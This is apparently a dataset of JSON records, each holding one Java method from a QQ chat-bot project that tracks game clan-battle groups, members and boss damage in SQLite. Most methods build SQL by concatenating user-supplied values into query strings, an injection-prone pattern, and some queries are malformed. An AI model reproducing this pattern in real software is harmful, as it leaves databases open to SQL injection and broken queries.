34248, "method_name": "creatGroup", "class_name": "DB", "params": ["Group", "String", "teamMember"], "throws": null, "modifiers": ["public", "synchronized"], "return_type": "int", "snippet": "    public synchronized int  creatGroup(Group group,String masterName,teamMember teamMember){\n        String sql=\"select name from teamMember where userQQ=\"+group.getGroupMasterQQ();\n        RowMapper<Integer> rowMapper= (rs, index) -> rs.getInt(\"id\");\n        try {\n            String i=h.executeQuery(sql,String.class);\n            return 0;//\u5df2\u7ecf\u6709\u4e00\u4e2a\u793e\u56e2\u4e86\n        } catch (SQLException e) {\n            //\u6ca1\u6709\u627e\u5230\n            String sql1=\"insert into _group values(null,\\\"\"+group.getGroupid()+\"\\\",\\\"\"+group.getGroupName()+\"\\\",\\\"\"+group.getGroupMasterQQ()+\"\\\",\\\"\"+group.getCreateDate()+\"\\\")\";\n            try {\n                System.out.println(sql1);\n                h.executeUpdate(sql1);\n                sql1=\"select id from _group where groupid=\\\"\"+group.getGroupid()+\"\\\"\";\n                int i=h.executeQuery(sql1,rowMapper).get(0);\n                teamMember teamMember1=new teamMember(group.getGroupMasterQQ(),true,i, masterName);\n                joinGroup(teamMember1,group.getGroupName());//\u628a\u56e2\u957f\u52a0\u8fdb\u53bb\uff0c\u9ed8\u8ba4\u521b\u7684\u4eba\u662f\u56e2\u957f\n                teamMember.setId(i);\n                joinGroup(teamMember,group.getGroupName());\n                return 1;//\u521b\u5efa\u6210\u529f\n            } catch (SQLException e1) {\n                e1.printStackTrace();\n            } catch (ClassNotFoundException e1) {\n                e1.printStackTrace();\n            }\n        } catch (ClassNotFoundException e) {\n            e.printStackTrace();\n        } catch (IllegalAccessException e) {\n            e.printStackTrace();\n        } catch (InstantiationException e) {\n            e.printStackTrace();\n        }catch (NullPointerException e){\n            e.printStackTrace();\n        }\n        return -1;\n    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/sqLite/DB.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34249, "method_name": "joinGroup", "class_name": "DB", "params": ["teamMember", "String"], "throws": null, "modifiers": ["public", "synchronized"], "return_type": "int", "snippet": "    public synchronized int joinGroup(teamMember teamMember, String groupQQ) {\n        String sql=\"select name from teamMember where userQQ=\\\"\"+teamMember.getUserQQ()+\"\\\"\";//\u662f\u5426\u5df2\u7ecf\u8fdb\u8fc7\u793e\u56e2\n        String sql1 = \"select id from _group where groupid=\\\"\" + groupQQ + \"\\\"\";//\u627e\u793e\u56e2\u4e3b\u952e\n        RowMapper<Integer> rowMapper= (rs, index) -> rs.getInt(\"id\");\n        RowMapper<Integer> rowMapper1= (rs, index) -> rs.getInt(\"count(*)\");\n        RowMapper<String> rowMapper2= (rs, index) -> rs.getString(\"name\");\n        try {\n            List<String> i=h.executeQuery(sql,rowMapper2);\n            i.get(0);\n            return 0;//\u5df2\u7ecf\u6709\u793e\u56e2\u4e0d\u5141\u8bb8\u518d\u8fdb\n        } catch (IndexOutOfBoundsException e) {\n            try {\n                List<Integer> i = h.executeQuery(sql1, rowMapper);\n                String sql3 = \"select count(*) from teamMember where id=\" + i.get(0);\n                List<Integer> j = h.executeQuery(sql3, rowMapper1);\n\n                if (j.get(0) > 30) {\n                    return 1;//\u4eba\u6ee1\u4e86\u4e0d\u80fd\u8fdb\n                }\n                System.out.println(teamMember.getName() != null && teamMember.getName().length() != 0 ? pcrGroupMap.get(teamMember.getUserQQ()) : teamMember.getName());\n                System.out.println(teamMember.getName() );\n                String sql2 = \"insert into teamMember(userQQ,id,name,power) values(\\\"\" +\n                        teamMember.getUserQQ() + \"\\\",\"\n                        + i.get(0) + \",\\\"\"\n                        + (teamMember.getName() != null && teamMember.getName().length() != 0 ? pcrGroupMap.get(teamMember.getUserQQ()) : teamMember.getName()) + \"\\\",\"\n                        + (teamMember.isPower() ? 1 : 0)\n                        + \")\";\n                h.executeUpdate(sql2);//\u63d2\u5165\u8868\u4e2d\u5360\u4e2a\u5751\n                return 2;\n            } catch (SQLException e1) {\n                e1.printStackTrace();\n            } catch (ClassNotFoundException e1) {\n                e1.printStackTrace();\n            } catch (IndexOutOfBoundsException e2) {\n                e.printStackTrace();\n                return 3;//\u6ca1\u6709\u8fd9\u4e2a\u793e\u56e2\n            }\n        }catch (ClassNotFoundException e) {\n                e.printStackTrace();\n        } catch (SQLException e) {\n            e.printStackTrace();\n        }\n        return -1;\n    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/sqLite/DB.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34250, "method_name": "outGroup", "class_name": "DB", "params": ["String"], "throws": null, "modifiers": ["public", "synchronized"], "return_type": "int", "snippet": "    public synchronized int outGroup(String userQQ) {\n        String sql1 = \"select id from teamMember where userQQ=\\\"\" + userQQ + \"\\\"\";//\u627e\u793e\u56e2\u4e3b\u952e\n        RowMapper<Integer> rowMapper = (rs, index) -> rs.getInt(\"id\");\n        try {\n            List<Integer> i = h.executeQuery(sql1, rowMapper);\n            i.get(0);\n            String sql3=\"delete from teamMember where userQQ=\"+userQQ;\n            h.executeUpdate(sql3);//\u5220\u9664\u8d44\u6599\n            String sql4 = \"delete from tree where userId=\" + userQQ;\n            h.executeUpdate(sql4);//\u5220\u9664\u8d44\u6599\n            return 0;\n        } catch (SQLException | NullPointerException | IndexOutOfBoundsException e) {\n            return 1;//\u6ca1\u793e\u56e2\u9000\u4e0d\u4e86\n        } catch (ClassNotFoundException e) {\n            e.printStackTrace();\n        }\n        return -1;\n    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/sqLite/DB.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34251, "method_name": "joinTree", "class_name": "DB", "params": ["String"], "throws": null, "modifiers": ["public", "synchronized"], "return_type": "int", "snippet": "        public synchronized int joinTree(String QQ) {\n        String date=new SimpleDateFormat(dateFormat).format(new Date());\n        String sql=\"select groupid from teamMember,_group where teamMember.id=_group.id and teamMember.userQQ=\"+QQ+\";\";\n            String sql2 = \"select date from tree where userId=\" + QQ + \";\";\n            String sql1 = \"insert into tree values(\\\"\" + QQ + \"\\\",\\\"\" + date + \"\\\",0\" + \");\";\n            RowMapper<String> rowMapper = (rs, index) -> rs.getString(\"groupid\");\n            RowMapper<String> rowMapper1 = (rs, index) -> rs.getString(\"date\");\n        try {\n            h.executeQuery(sql, rowMapper).get(0);\n            if (h.executeQuery(sql2, rowMapper1).size() != 0) {\n                return 2;//src.append(\"\u00bf,\u6253\u54a9\uff0c\u6ca1\u6709\u7b2c\u4e8c\u68f5\u6811\u80fd\u4e0a\u4e86\");\n            }\n            h.executeUpdate(sql1);\n            return 3;//src.append(\"\u5df2\u6302\u4e1c\u5357\u679d\");\n        } catch (SQLException e) {\n            e.printStackTrace();\n        } catch (ClassNotFoundException e) {\n            e.printStackTrace();\n        } catch (IndexOutOfBoundsException e) {\n            return 1;//\u8fd9\u4e2a\u662f\u6570\u636e\u5e93\u6ca1\u6709\u6570\u636e\n        }\n        return -1;\n    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/sqLite/DB.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34252, "method_name": "trueTree", "class_name": "DB", "params": ["String", "String"], "throws": null, "modifiers": ["public", "synchronized"], "return_type": "int", "snippet": "    public synchronized int trueTree(String QQ,String groupQQ){\n        String sql = \"select groupid from teamMember,_group where teamMember.id=_group.id and teamMember.userQQ=\\\"\" + QQ + \"\\\";\";\n        String sql2 = \"select date from tree where userId=\\\"\" + QQ + \"\\\";\";\n        String sql1 = \"update tree set isTree=1 where userId=\\\"\" + QQ + \"\\\"\";\n        RowMapper<String> rowMapper = (rs, index) -> rs.getString(\"groupid\");\n        RowMapper<String> rowMapper1 = (rs, index) -> rs.getString(\"date\");\n        try {\n            String i = h.executeQuery(sql, rowMapper).get(0);//\u83b7\u53d6\u5de5\u4f1a\u7fa4\u53f7\n            List<String> list = h.executeQuery(sql2, rowMapper1);\n            if (list.size() != 0) {//\u6570\u636e\u5e93\u6709\u6302\u6811\u7684\u8d44\u6599\uff0c\u662f\u771f\u7684\u6302\u4e86\n                h.executeUpdate(sql1);\n                return 2;//src.append(\"\u5df2\u7ecf\u6302\u7262\u4e86\uff0c\u4e0d\u8981\u60f3\u5077\u5077\u4ece\u6811\u4e0a\u6e9c\u8d70\u4e86\u54df\u2665\");\n            } else {\n\n                return 3;//src.append(\"\u554a\u8fd9\uff0c\u4ffa\u5bfb\u601d\u6811\u4e0a\u4e5f\u59b9\u4f60\u5f71\u554a\");\n            }\n        } catch (SQLException e) {\n            e.printStackTrace();\n        } catch (ClassNotFoundException e) {\n            e.printStackTrace();\n        } catch (IndexOutOfBoundsException e) {//\u83b7\u53d6\u5de5\u4f1a\u7fa4\u53f7\u5931\u8d25\n            return 1;\n        }\n        return -1;\n    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/sqLite/DB.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34253, "method_name": "changeGroupMaster", "class_name": "DB", "params": ["String", "String"], "throws": null, "modifiers": ["public", "synchronized"], "return_type": "int", "snippet": "    public synchronized int changeGroupMaster(String oldQQ, String newQQ) {\n        String oldID = \"select id from teamMember where userQQ=\\\"\" + oldQQ + \"\\\" \";\n        String newID = \"select id from teamMember where userQQ=\\\"\" + newQQ + \"\\\" \";\n        RowMapper<Integer> rowMapper = (rs, index) -> rs.getInt(\"id\");\n        RowMapper<Integer> rowMapper1 = (rs, index) -> rs.getInt(\"id\");\n        try {\n            int id1 = h.executeQuery(newID, rowMapper).get(0);\n            int id2 = h.executeQuery(oldID, rowMapper).get(0);\n            if (id1 == id2) {\n                //\u53ea\u6709\u4e24\u4e2a\u4eba\u5728\u540c\u4e00\u4e2a\u5de5\u4f1a\u624d\u53ef\u4ee5\n                String change1 = \"update _group set groupMasterQQ=\\\"\" + newQQ + \"\\\" where id=\" + id1;//\u8f6c\u8ba9\u4f1a\u957f\n                String change2 = \"update _group set power=1 where userQQ=\\\"\" + newQQ + \"\\\"\";//\u8bbe\u7f6e b\u4e3a\u7ba1\u7406\u5458\n                h.executeUpdate(change1, change2);//\u6539\u53d8\u7ba1\u7406\u5458\u6743\u9650\n                return 2;//\u6210\u529f\n            }\n            return 1;//\u4fe9\u4eba\u4e0d\u5728\u540c\u4e00\u4e2a\u5de5\u4f1a\n        } catch (SQLException e) {\n            e.printStackTrace();\n        } catch (ClassNotFoundException e) {\n            e.printStackTrace();\n        } catch (IndexOutOfBoundsException e) {\n            //\u6570\u636e\u5e93\u6ca1\u6709\u65b0\u4eba\u7684\u6570\u636e\n        }\n        return -1;\n    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/sqLite/DB.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34254, "method_name": "downAdmin", "class_name": "DB", "params": ["String", "String"], "throws": null, "modifiers": ["public", "synchronized"], "return_type": "int", "snippet": "    public synchronized int downAdmin(String superPowerQQ, String newQQ) {\n        String oldID = \"select id from teamMember where userQQ=\\\"\" + superPowerQQ + \"\\\" \";\n        String newID = \"select id from teamMember where userQQ=\\\"\" + newQQ + \"\\\" \";\n        RowMapper<Integer> rowMapper = (rs, index) -> rs.getInt(\"id\");\n        RowMapper<Integer> rowMapper1 = (rs, index) -> rs.getInt(\"id\");\n        try {\n            int id1 = h.executeQuery(newID, rowMapper).get(0);\n            int id2 = h.executeQuery(oldID, rowMapper).get(0);\n            if (id1 == id2) {\n                //\u53ea\u6709\u4e24\u4e2a\u4eba\u5728\u540c\u4e00\u4e2a\u5de5\u4f1a\u624d\u53ef\u4ee5\n                String change2 = \"update _group set power=0 where userQQ=\\\"\" + newQQ + \"\\\"\";//\u8bbe\u7f6e b\u4e3ade\u7ba1\u7406\u5458\n                h.executeUpdate(change2);//\u6539\u53d8\u7ba1\u7406\u5458\u6743\u9650\n                return 2;//\u6210\u529f\n            }\n            return 1;//\u4fe9\u4eba\u4e0d\u5728\u540c\u4e00\u4e2a\u5de5\u4f1a\n        } catch (SQLException e) {\n            e.printStackTrace();\n        } catch (ClassNotFoundException e) {\n            e.printStackTrace();\n        } catch (IndexOutOfBoundsException e) {\n            //\u6570\u636e\u5e93\u6ca1\u6709\u65b0\u4eba\u7684\u6570\u636e\n        }\n        return -1;\n    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/sqLite/DB.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34255, "method_name": "isSuperPower", "class_name": "DB", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isSuperPower(String groupQQ, String QQ) {\n        String sql = \"select groupid from _group where groupid=\\\"\" + groupQQ + \"\\\" and groupMasterQQ\" + QQ + \"\\\"\";\n        RowMapper<String> rowMapper = (rs, index) -> rs.getString(\"groupid\");\n\n        try {\n            if (h.executeQuery(sql, rowMapper).size() > 0) {//\u627e\u7740\u4e86\n                return true;\n            }\n        } catch (SQLException e) {\n            e.printStackTrace();\n        } catch (ClassNotFoundException e) {\n            e.printStackTrace();\n        }\n        return false;\n    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/sqLite/DB.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34256, "method_name": "searchVoidKnifeByGroup", "class_name": "DB", "params": ["String", "int"], "throws": null, "modifiers": ["public", "synchronized"], "return_type": "HashMap<String,Integer>", "snippet": "    public synchronized HashMap<String, Integer> searchVoidKnifeByGroup(String GroupQQ, int mode) {\n        String date=new SimpleDateFormat(dateFormat).format(new Date());\n        HashMap<String, Integer> map = null;\n        String sql1 = \"select userQQ from teamMember where id =(select id from _group where groupid =\\\"\" + GroupQQ + \"\\\");\";\n        String sql2 = \"select id from _group where groupid=\\\"\" + GroupQQ + \"\\\"\";\n\n        StringBuilder src=new StringBuilder(\"\u554a\u8fd9\uff0c\u8fd9\u6ce2\u597d\u50cf\u662f\u6ca1\u6709\u641c\u5230\u6570\u636e\\n\");\n        RowMapper<String> extractor1 = (rs, index) -> rs.getString(\"userQQ\");//\u8fd9\u4e2a\u5de5\u4f1a\u7684\u6210\u5458qq\n        RowMapper<String> mapper = (rs, index) -> rs.getString(\"startTime\");//\u968f\u4fbf\u83b7\u53d6\u4e2a\u503c\uff0c\u8bc1\u660e\u8fd9\u4e2a\u5de5\u4f1a\u6b63\u5728\u6253boss\n        RowMapper<Integer> mapper1 = (rs, index) -> rs.getInt(\"id\");//\u8fd9\u4e2a\u5de5\u4f1a\u7684\u4e3b\u952e\n        try {\n            if (1 == mode) {\n                //\u6574\u4e2a\u5de5\u4f1a\u67e5\u627e\n                List<Integer> list2 = h.executeQuery(sql2, mapper1);//\u8fd9\u4e2a\u5de5\u4f1a\u7684\u4e3b\u952e\n                String sql3 = \"select startTime  from progress where id=\\\"\" + list2.get(0) + \"\\\"\";//\u83b7\u53d6\u8fd9\u4e2a\u5de5\u4f1a\u6218\u5f00\u59cb\u65f6\u95f4\n                List<String> list3 = h.executeQuery(sql3, mapper);\n                if (list3.get(0).compareTo(date) < 0) {//\u6ca1boss\u8fdb\u5ea6\uff0c\u6216\u8fd8\u6ca1\u5230\u51fa\u5200\u65f6\u95f4\n                    return null;\n                }\n                List<Knife> knifes = searchKnife(null, GroupQQ, date);//\u4eca\u5929\u7684\u51fa\u5200\u8868\n                List<String> list1 = h.executeQuery(sql1, extractor1);//\u5de5\u4f1a\u6210\u5458\u5168\u5458\u7a7a\u5200\u8868\n                map = new HashMap<>();\n                for (String s : list1) {\n                    map.put(s, 3);\n                }\n                for (Knife knife : knifes) {\n                    if (knife.isComplete()) {\n                        map.put(knife.getKnifeQQ(), map.get(knife.getKnifeQQ()) - 1);\n                    }\n                }\n            } else {\n                map = (HashMap<String, Integer>) searchKnife(GroupQQ, date);//\u4eca\u5929\u7684\u51fa\u5200\u8868\n                Set<String> set = map.keySet();\n                for (String s : set) {\n                    map.put(s, 3 - map.get(s));\n                }\n            }\n\n        } catch (SQLException e) {\n            e.printStackTrace();\n        } catch (ClassNotFoundException e) {\n            e.printStackTrace();\n        } catch (IndexOutOfBoundsException e) {//\u6ca1\u627e\u7740\u51fa\u5200\u4fe1\u606f\n            e.printStackTrace();\n        }\n        return map;\n    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/sqLite/DB.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34257, "method_name": "startFight", "class_name": "DB", "params": ["String", "String", "String"], "throws": null, "modifiers": ["public", "synchronized"], "return_type": "int", "snippet": "    public synchronized int startFight(String groupCode, String applyQQ, String date) {\n        StringBuilder stringBuilder=new StringBuilder();\n        SimpleDateFormat simpleDateFormat = new SimpleDateFormat(dateFormat);\n        if (date.equals(\"\")) {\n            date = simpleDateFormat.format(new Date());\n        }\n        //\u83b7\u53d68\u5929\u540e\u65e5\u671f\n        Date date1 = null;\n        try {\n            date1 = simpleDateFormat.parse(date);//\u65e5\u671f\u8f93\u5165\u683c\u5f0f\u9519\u8bef\n        } catch (ParseException e) {\n            return 3;\n        }\n        Calendar calendar = Calendar.getInstance();\n        calendar.setTime(date1);\n        calendar.add(Calendar.DATE, 8);\n        String endDate = simpleDateFormat.format(calendar.getTime());\n        RowMapper<Integer> rowMapper1= (rs, index) -> rs.getInt(\"id\");\n        if (powerCheck(applyQQ, groupCode)) {\n            try {\n                stringBuilder.append(\"select id from _group where groupid=\\\"\").append(groupCode).append(\"\\\";\");\n                List<Integer> integerList = h.executeQuery(stringBuilder.toString(), rowMapper1);\n                if (integerList != null) {\n                    stringBuilder.delete(0, stringBuilder.length());\n                    stringBuilder.append(\"insert into progress values(\").append(groupCode).append(\",\").append(integerList.get(0)).append(\",1,1,\").append(getBossHpLimit(0)).append(\",\\\"\").append(date).append(\"\\\",\\\"\").append(endDate).append(\"\\\")\");//-1\u4e3a\u8fd8\u672a\u5f55\u5165\u8840\u91cf\u7684\u72b6\u6001\n\n                    h.executeUpdate(stringBuilder.toString());\n                    if (date.equals(simpleDateFormat.format(new Date()))) {\n                        return 1;//\u6210\u529f\u5f00\u59cb,\u4e14\u5c31\u5728\u8fd9\u4e00\u5929\n                    }\n                    return 4;\n                }\n                return 2;//\u5df2\u7ecf\u5f00\u59cb\u4e86\n\n            } catch (ClassNotFoundException | SQLException e) {\n                e.printStackTrace();\n            } catch (IndexOutOfBoundsException e) {\n                e.printStackTrace();\n                return 0;//\u6570\u636e\u5e93\u79bb\u8fd8\u6ca1\u5efa\u8fd9\u4e2a\u5de5\u4f1a\u6216\u8005\u6ca1\u8fd9\u6743\u9650\n            }\n        }\n        return -1;\n    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/sqLite/DB.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34258, "method_name": "searchGroupNameByQQcode", "class_name": "DB", "params": ["String", "int"], "throws": null, "modifiers": ["public", "synchronized"], "return_type": "String", "snippet": "    public synchronized String searchGroupNameByQQcode(String QQ, int mode) {\n        String groupName = null;\n        RowMapper<String> rowMapper = (rs, index) -> rs.getString(\"groupName\");\n        try {\n            switch (mode) {\n                case 1:\n                    String sql1 = \"select groupName  from _group,teamMember where _group.id= teamMember.id and userQQ=\\\"\" + QQ + \"\\\"\";\n                    groupName = h.executeQuery(sql1, rowMapper).get(0);\n                    break;\n                case 2:\n                    String sql2 = \"select groupName from _group where groupid=\\\"\" + QQ + \"\\\"\";\n                    groupName = h.executeQuery(sql2, rowMapper).get(0);\n                    break;\n            }\n        } catch (SQLException e) {\n            e.printStackTrace();\n        } catch (ClassNotFoundException e) {\n            e.printStackTrace();\n        } catch (IndexOutOfBoundsException e) {\n            //\u6ca1\u67e5\u5230\u8fd4\u56de\u7a7a\n        }\n        return groupName;\n    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/sqLite/DB.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34259, "method_name": "searchName", "class_name": "DB", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String searchName(String QQ) {\n        String sql = \"select name from teamMember where userQQ=\\\"\" + QQ + \"\\\"\";\n        RowMapper<String> rowMapper = new RowMapper<String>() {\n            @Override\n            public String mapRow(ResultSet rs, int index) throws SQLException {\n                return rs.getString(\"name\");\n            }\n        };\n        String name = null;\n        try {\n            name = h.executeQuery(sql, rowMapper).get(0);\n\n        } catch (SQLException | ClassNotFoundException e) {\n            e.printStackTrace();\n        } catch (IndexOutOfBoundsException e) {\n\n        }\n        return name;\n    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/sqLite/DB.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34260, "method_name": "endFight", "class_name": "DB", "params": ["String", "String"], "throws": null, "modifiers": ["public", "synchronized"], "return_type": "int", "snippet": "    public synchronized int endFight(String groupCode,String applyQQ){\n        StringBuilder stringBuilder=new StringBuilder();\n        stringBuilder.append(\"select count(*) from _group where groupid=\\\"\").append(groupCode).append(\"\\\" and groupMasterQQ=\\\"\").append(applyQQ).append(\"\\\";\");\n        RowMapper<Integer> rowMapper= (rs, index) -> rs.getInt(\"count(*)\");\n        RowMapper<Integer> rowMapper1= (rs, index) -> rs.getInt(\"id\");\n        try {\n            if (h.executeQuery(stringBuilder.toString(), rowMapper).get(0)!=0){\n                stringBuilder.delete(0,stringBuilder.length());\n                stringBuilder.append(\"select id from _group where groupid=\\\"\").append(groupCode).append(\"\\\";\");\n                System.out.println(stringBuilder);\n                List<Integer> integerList=h.executeQuery(stringBuilder.toString(),rowMapper1);//\u5de5\u4f1a\u4e3b\u952e\n                if (integerList.size()!=0){\n                    stringBuilder.delete(0,stringBuilder.length());\n                    stringBuilder.append(\"delete from progress where id=\").append(integerList.get(0));//\u5220\u9664\u8fdb\u5ea6\u6761\u8bb0\u5f55\n                    h.executeUpdate(stringBuilder.toString());\n                    stringBuilder.delete(0,stringBuilder.length());\n                    stringBuilder.append(\"delete from tree where userId in(select userQQ from teamMember where id=\").append(integerList.get(0)).append(\")\");//\u5220\u9664\u6811\u4e0a\u7684\u4eba\n                    h.executeUpdate(stringBuilder.toString());\n                    return 1;//\u5220\u9664\u6210\u529f\n                }\n                return 2;//\u6ca1\u53ef\u4ee5\u5220\u7684\u4e1c\u897f\n            }\n            return 0;//\u6570\u636e\u5e93\u79bb\u8fd8\u6ca1\u5efa\u8fd9\u4e2a\u5de5\u4f1a\u6216\u8005\u6ca1\u8fd9\u6743\u9650\n        } catch (ClassNotFoundException | SQLException e) {\n            e.printStackTrace();\n        }\n        return -1;\n    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/sqLite/DB.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34261, "method_name": "hurtfight", "class_name": "DB", "params": ["String", "int", "MsgSender"], "throws": null, "modifiers": ["public", "synchronized"], "return_type": "void", "snippet": "    public synchronized void hurtfight(String QQ,int hurt,MsgSender sender){\n        StringBuilder stringBuilder=new StringBuilder(\"select loop,serial,Remnant,teamMember.id  from teamMember ,progress where userQQ=\\\"\");\n        stringBuilder.append(QQ).append(\"\\\" and progress.id=teamMember.id\");\n        StringBuilder tips=new StringBuilder();\n        boolean complete;\n        RowMapper<Integer[]> rowMapper= (rs, index) -> {\n            Integer[] i = new Integer[4];\n            i[0] = rs.getInt(\"loop\");\n            i[1] = rs.getInt(\"serial\");\n            i[2] = rs.getInt(\"Remnant\");\n            i[3] = rs.getInt(\"id\");\n            return i;\n        };//\u83b7\u53d6boss\u5c5e\u6027\n        RowMapper<String> rowMapper1= (rs, index) -> rs.getString(\"userId\");//\u83b7\u53d6\u88ab\u6551\u4e0b\u6765\u4eba\u7684qq\u53f7\n        RowMapper<String> rowMapper2= (rs, index) -> rs.getString(\"groupid\");//\u83b7\u53d6\u901a\u77e5\u7684\u7fa4\u53f7\n        RowMapper<Boolean> rowMapper3 = (rs, index) -> rs.getBoolean(\"complete\");//\u83b7\u53d6\u6700\u8fd1\u4e00\u6b21\u7684\u51fa\u5200\u662f\u5426\u4e3a\u8fc7\u76c8\u5c3e\u5200\uff0c\u5224\u65ad\u8fd9\u6b21\u662f\u5426\u4e3a\u8865\u65f6\u5200\n\n        try {\n            List<Integer[]> list=h.executeQuery(stringBuilder.toString(),rowMapper);//\u83b7\u53d6\u73b0\u5728boss\u7684\u751f\u547d\uff0c\u5468\u76ee\n\n            //\u627e\u8fd9\u4e2a\u5de5\u4f1a\u7684\u7fa4\u53f7\n            String string = \"select groupid from _group where id=\" + list.get(0)[3];\n            List<String> list2 = h.executeQuery(string, rowMapper2);\n            String groupQQ = list2.get(0);\n\n            //\u67e5\u8be2\u8fd9\u4e2a\u4eba\u51fa\u6ca1\u51fa\u5b8c\u4e09\u5200\n            if (!ningpeichudaoma(QQ)) {\n                sender.SENDER.sendGroupMsg(groupQQ, \"\u5df2\u7ecf\u51fa\u5b8c\u4e09\u5200\u60f9\");\n                return;\n            }\n\n            if(list!=null){\n                //\u4e0b\u6811\n                stringBuilder.delete(0,stringBuilder.length());\n                stringBuilder.append(\"delete from tree where userId=\\\"\"+QQ+\"\\\"\");\n                h.executeUpdate(stringBuilder.toString());\n\n                //\u8ba1\u7b97boss\u8840\u91cf\uff0c\u5206\u6210\u6253\u7206\u5904\u7406\uff08\u6709\u6551\u6811\u6d41\u7a0b\uff09\u548c\u6ca1\u6253\u7206\u5904\u7406\n                int hurt_active;\n                if (list.get(0)[2] - hurt>0){\n                    hurt_active=hurt;\n                    stringBuilder.delete(0, stringBuilder.length());\n                    stringBuilder.append(\"update progress set \").append(\"Remnant=\").append(list.get(0)[2] - hurt).append(\" where id=\").append(list.get(0)[3]);\n                    h.executeUpdate(stringBuilder.toString());\n                    complete = true;\n                    //\u6ca1\u6253\u7a7fboss\n                }else {\n                    hurt_active = list.get(0)[2];//\u4f24\u5bb3\u6253\u7a7f\u4e86\uff0c\u8fdb\u5165\u4e0b\u4e00\u6a21\u5f0f\n                    int loop = (list.get(0)[1] == 5 ? list.get(0)[0] + 1 : list.get(0)[0]);\n                    int serial = (list.get(0)[1] == 5 ? 1 : list.get(0)[1] + 1);\n                    //\u66f4\u65b0boss\n                    stringBuilder.delete(0, stringBuilder.length());\n                    stringBuilder.append(\"update progress set loop= \").append(loop).append(\",serial=\").append(serial).append(\",Remnant=\").append(getBossHpLimit(serial - 1)).append(\" where id=\\\"\").append(list.get(0)[3]).append(\"\\\"\");\n                    h.executeUpdate(stringBuilder.toString());\n                    //\u8fdb\u5165\u6551\u6811\u6a21\u5f0f\uff0c\u628a\u6811\u4e0a\u7684\u4eba\u90fd\u565c\u4e0b\u6765\n                    stringBuilder.delete(0,stringBuilder.length());\n                    stringBuilder.append(\"select userId from tree where  userId in(select userQQ from teamMember where id=\"+list.get(0)[3]+\")\");\n                    List<String> list1=h.executeQuery(stringBuilder.toString(), rowMapper1);\n\n                    if (list1.size() > 0) {\n                        tips.append(\"\u4e0b\u6811\u5566\uff0c\u4e0b\u6811\u5566\");\n                        for (String s : list1) {\n                            tips.append(\"[CQ:at,qq=\").append(s).append(\"] \");\n                        }\n                        sender.SENDER.sendGroupMsg(groupQQ, tips.toString());//\u5c06\u6551\u4e0b\u6811\u7684\u4eba\u901a\u77e5\n                    }\n\n                    stringBuilder.delete(0,stringBuilder.length());\n                    stringBuilder.append(\"delete from tree where  userId in(select userQQ from teamMember where id=\"+list.get(0)[3]+\")\");\n                    h.executeUpdate(stringBuilder.toString());\n                    //\u770b\u770b\u8fd9\u5200\u662f\u4e0d\u662f\u8865\u65f6\u5200\n\n                    stringBuilder.delete(0, stringBuilder.length());\n                    stringBuilder.append(\"select no,complete from knife where knifeQQ=\\\"\").append(QQ).append(\"\\\" order by no\");\n                    List<Boolean> list3 = h.executeQuery(stringBuilder.toString(), rowMapper3);\n\n                    if (list3.size() != 0 && !list3.get(list3.size() - 1)) {\n                        complete = true;//\u8865\u65f6\u5200\u5f3a\u5236\u4e0d\u53ef\u5957\u5a03\n                    } else {\n                        complete = false;\n                    }\n                    //\u8fd9\u5200\u6253\u7206\u4e86boss\n                }\n                //\u4ea4\u6210\u7ee9\n                stringBuilder.delete(0, stringBuilder.length());\n                stringBuilder.append(\"insert into knife values(\" + QQ + \",\").append(list.get(0)[1] + list.get(0)[0] * 10).append(\",\").append(hurt_active).append(\",\\\"\").append(GetPrincessTime(groupQQ)).append(\"\\\",\" + (complete ? 1 : 0) + \")\");\n                h.executeUpdate(stringBuilder.toString());\n                tips.delete(0, tips.length());\n                tips.append(\"\u5df2\u4ea4\u5200,[CQ:at,qq=\").append(QQ).append(\"]\");\n                sender.SENDER.sendGroupMsg(groupQQ,tips.toString());//\u5c06\u6551\u4e0b\u6811\u7684\u4eba\u901a\u77e5\n            }\n        } catch (SQLException e) {\n            e.printStackTrace();\n        } catch (ClassNotFoundException e) {\n            e.printStackTrace();\n        }\n\n    }", "url": 